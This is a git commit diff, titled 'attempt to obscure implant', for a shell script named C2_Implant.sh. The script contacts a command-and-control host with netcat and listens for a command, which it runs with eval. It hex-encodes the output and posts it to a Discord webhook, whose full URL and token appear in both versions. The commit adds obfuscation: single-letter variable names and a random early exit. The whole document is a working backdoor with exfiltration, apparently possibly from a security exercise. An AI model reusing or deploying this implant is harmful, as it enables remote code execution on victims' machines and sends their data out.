51f2e37064068af54c75c0eff7c65bbe66de02a0
Maximillian Sonderegger <maxmsonderegger@gmail.com>
2024-05-07 14:41:32 -0400

    attempt to obscure implant

--- C2_Implant.sh
+++ C2_Implant.sh
@@ -1,34 +1,42 @@
 set -x
 
-CHALLENGE="Bandits ate my Natass"
-DEBUG=0
-MAC_STYLE=1
-WEB_HOOK_URL='https://discord.com/api/webhooks/1237246637814972507/gJCg8LBG6mHLBquE7iaQWP2UW7ak1uL5Eloz5MjJBS7U9utkUIsPDe5Fm4FavjfQUNnk'
-if [ $DEBUG == 1 ] 
+A=4
+
+if [ $(($RANDOM % $A)) != 0 ]
 then
-    C2_IP='127.0.0.1'
-    C2_PORT=554
-else
-    C2_IP="10.0.1.3"
-    C2_PORT=23766
+    exit
 fi
 
-if [ $MAC_STYLE == 1 ]
+B="Bandits ate my Natass"
+C=0
+D=1
+E='https://discord.com/api/webhooks/1237246637814972507/gJCg8LBG6mHLBquE7iaQWP2UW7ak1uL5Eloz5MjJBS7U9utkUIsPDe5Fm4FavjfQUNnk'
+F=10
+if [ $C == 1 ] 
 then
-    NC_LISTEN_PARAMS="-lv"
-    TIMEOUT_PARAMS=""
+    G='127.0.0.1'
+    H=554
 else
-    NC_LISTEN_PARAMS="-lp"
-    TIMEOUT_PARAMS="-t"
+    G="10.0.1.3"
+    H=23766
 fi
 
-CSEQ=$RANDOM
-PORT=$((5000+($RANDOM % 10000)))
+if [ $D == 1 ]
+then
+    I="-lv"
+    J=""
+else
+    I="-lp"
+    J="-t"
+fi
 
-cat << EOF | unix2dos | timeout $TIMEOUT_PARAMS 10 nc $C2_IP $C2_PORT
-$CHALLENGE
+K=$RANDOM
+L=$((5000+($RANDOM % 10000)))
+
+cat << EOF | unix2dos | timeout $J $F nc $G $H
+$B
 OPTIONS /KylerHowAreTheKids RTSP/1.0
-CSeq: $PORT
+K: $L
 
 EOF
 
@@ -38,19 +46,19 @@ then
     exit
 fi
 
-COMMAND=$(timeout $TIMEOUT_PARAMS 10 nc $NC_LISTEN_PARAMS $PORT)
+M=$(timeout $J $F nc $I $L)
 
 if [ $? != 0 ]
 then
-    echo "LMAO: Couldn't receive command from C2"
+    echo "LMAO: Couldn't receive M from C2"
     exit
 fi
 
-RESULT=$(echo $(eval $(echo -e $COMMAND)) | hexdump -ve '/1 "%02x"')
+N=$(echo $(eval $(echo -e $M)) | hexdump -ve '/1 "%02x"')
 
-RESPONSE={\"content\":\"$RESULT\"}
+O={\"content\":\"$N\"}
 
-echo \'$(echo $RESPONSE)\'
+echo \'$(echo $O)\'
 
-wget --method=POST --header="Content-Type: application/json" --body-data=$(echo $RESPONSE)  $WEB_HOOK_URL
+wget --method=POST --header="Content-Type: application/json" --body-data=$(echo $O)  $E
 
